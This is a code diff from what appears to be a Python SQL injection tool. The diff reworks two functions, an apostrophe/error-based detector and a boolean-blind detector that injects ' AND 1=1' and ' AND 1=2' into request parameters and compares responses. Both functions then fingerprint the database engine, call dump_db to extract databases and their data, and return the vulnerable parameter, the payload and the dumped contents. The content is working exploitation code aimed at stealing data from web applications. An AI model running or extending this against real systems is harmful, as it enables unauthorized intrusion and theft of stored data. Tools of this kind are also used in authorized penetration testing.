@@ -30,26 +30,37 @@ def inject_apostrophe(name,value, params, parsed_url, method):
     r = send(parsed_url, params, method)
     copy_r = send(parsed_url, copy, method)
     if(r.status_code == 200 and copy_r.status_code == 500):
-        print("website vulnerable on this param :", name)
         engine = get_engine(parsed_url, value, name, params)
-        print("engine ok")
         Ctx = namedtuple("Ctx", ["url", "params", "name", "method"])
         ctx = Ctx(parsed_url, params, name, method)
-        data = dump_db(ctx, engine)
-        return data
-    return
+        dump = dump_db(ctx, engine)
+        final_dump= {
+            "vulnerable param": name, 
+            "payload": copy[name],
+            "engine": engine["type"],
+            "bases": dump["bases"],
+            "data": dump["data"]
+        }
+        return final_dump
 
 def inject_bool(name,value, params, parsed_url, method):
     copy = params.copy()
     copy[name] = value+ ' AND 1=1'
-    fail_copy = params.copy()
-    fail_copy[name] = value+ ' AND 1=2'
-    query = urlencode(copy, doseq=True)
-    fail_query = urlencode(fail_copy, doseq=True)
-    fail_injection = parsed_url._replace(query=fail_query)
-    injection = parsed_url._replace(query=query)
-    r = requests.get(parsed_url.geturl())
-    copy_r = requests.get(injection.geturl())
-    fail_r =  requests.get(fail_injection.geturl())
-    if(ecart(len(copy_r.text), len(r.text)) < 10 and ecart(len(fail_r.text), len(copy_r.text)) > 30):
-        print("webiste vulnerable on this param :", name)
+    fcopy = params.copy()
+    fcopy[name] = value+ ' AND 1=2'
+    r = send(parsed_url, params, method)
+    r_copy= send(parsed_url, copy, method)
+    fail_r = send(parsed_url, fcopy, method)
+    if(ecart(len(r_copy.text), len(r.text)) < 10 and ecart(len(fail_r.text), len(r_copy.text)) > 30):
+        engine = get_engine(parsed_url, value, name, params)
+        Ctx = namedtuple("Ctx", ["url", "params", "name", "method"])
+        ctx = Ctx(parsed_url, params, name, method)
+        dump = dump_db(ctx, engine)
+        final_dump= {
+            "vulnerable param": name, 
+            "payload": copy[name],
+            "engine": engine["type"],
+            "bases": dump["bases"],
+            "data": dump["data"]
+        }
+        return final_dump
